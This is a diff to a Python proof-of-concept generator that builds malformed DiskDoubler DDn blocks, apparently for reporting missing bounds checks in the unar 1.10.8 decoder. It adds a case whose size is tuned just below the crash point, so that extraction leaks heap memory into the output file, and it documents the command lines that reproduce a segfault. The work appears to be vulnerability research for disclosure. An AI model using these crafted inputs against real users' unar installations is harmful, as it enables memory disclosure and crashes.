@@ -1,18 +1,21 @@
 #!/usr/bin/env python3
-"""Four crafted DDn (DiskDoubler method 10) blocks for the checks
-`XADDiskDoublerDDnHandle.m` is missing, each one 148-218 bytes: one
+"""Five crafted DDn (DiskDoubler method 10) blocks for the checks
+`XADDiskDoublerDDnHandle.m` is missing, each one 148-225 bytes: one
 `0xABCD0054` container, one DDn data fork, no reference to any fixture.
 
-Our own `fmt_dd.c` guards all four (commit 7520f9a09, DECISIONS.md
-2026-11-03, *the symbols no encoder writes*); that entry's evidence was
-UBSan on OUR build, never a run against `unar` itself (none was
-installed when it was written). This is that run, against `unar` 1.10.8
-and `reference/XADMaster/XADDiskDoublerDDnHandle.m` (MacPaw 7cb9ee0).
+Our own `fmt_dd.c` guards the gap all five share (commit 7520f9a09,
+DECISIONS.md 2026-11-03, *the symbols no encoder writes*); that entry's
+evidence was UBSan on OUR build, never a run against `unar` itself (none
+was installed when it was written). This is that run, against `unar`
+1.10.8 and `reference/XADMaster/XADDiskDoublerDDnHandle.m` (MacPaw
+7cb9ee0). (e) is new (2026-11-05): the same unchecked read as (d), kept
+inside mapped memory instead of crashing.
 
-    make_repro_unchecked.py -o /tmp/ddn           # writes case_a/b/c/d.dd
+    make_repro_unchecked.py -o /tmp/ddn           # writes case_a/b/c/d/e.dd
     unar -f /tmp/ddn/case_d.dd                    # unar 1.10.8: segfault
+    unar -f /tmp/ddn/case_e.dd                    # unar 1.10.8: exit 0, leaks heap
 
-A real DDn block cannot carry any of the four: a correct encoder's
+A real DDn block cannot carry any of the five: a correct encoder's
 length-code stream is driven by the same literal/offset counts it writes
 as `numliterals`/`numoffsets`, and a block ends exactly when its own
 `uncompsize` bytes have been produced (`tools/derive_dd.py` `fork()`,
@@ -44,6 +47,12 @@ d) `literalptr`/`offsetptr` are read with no check against
    segfaults reading one byte off the end of a heap allocation, after
    writing some of the declared output (reproduced 3/3 runs; same fault
    instruction and address as (b)).
+e) the same gap as (d), run just long enough to stay inside mapped
+   memory. CONFIRMED AS AN INFORMATION LEAK: unar exits 0 and the
+   extracted file holds thousands of bytes that are not among the
+   block's own declared literals — heap memory the stream never
+   supplied, copied into the output (`tools/xadmaster-ddn-repro/ISSUE.md`
+   has the counts, 2026-11-05).
 
 Source: reference/XADMaster/XADDiskDoublerDDnHandle.m
         -readBlockAtPosition: and -nextLiteralOrOffset:andLength:atPosition:
@@ -223,7 +232,28 @@ def case_d(uncompsize=0x400000):
     return _container(blk, uncompsize)
 
 
-CASES = {"a": case_a, "b": case_b, "c": case_c, "d": case_d}
+def case_e(outer=204096, numliterals=16, marker=0x5A):
+    """Same gap as (d), but the run stays inside mapped memory instead
+    of crashing — the information-leak variant. `numliterals` real
+    literals, every one `marker`, then a length-code run clamped to
+    exactly `outer` bytes by the block's own declared size (not by any
+    bound on `literalptr`). Any output byte after the first
+    `numliterals` that is not `marker` is something the stream never
+    supplied.
+
+    `outer` is empirically safe: sweeping the declared size against the
+    real `unar` 1.10.8 binary, 262,145 B still exits 0 and 300,000 B
+    already segfaults (2026-11-05); 204,096 B leaves a wide margin on
+    the safe side of that boundary."""
+    code = 128 + max(1, (outer - 1).bit_length())  # 1<<(code-128) >= outer
+    off = _code_section(2, {0: 1, 1: 1}, _BitW())
+    length = _lengths_section(code + 1, {code: 1, 0: 1}, [code])
+    lit = bytes([marker]) * numliterals
+    blk = _block(outer, numliterals, 0, off, _literals_section(lit), length)
+    return _container(blk, outer)
+
+
+CASES = {"a": case_a, "b": case_b, "c": case_c, "d": case_d, "e": case_e}
 
 
 def main():
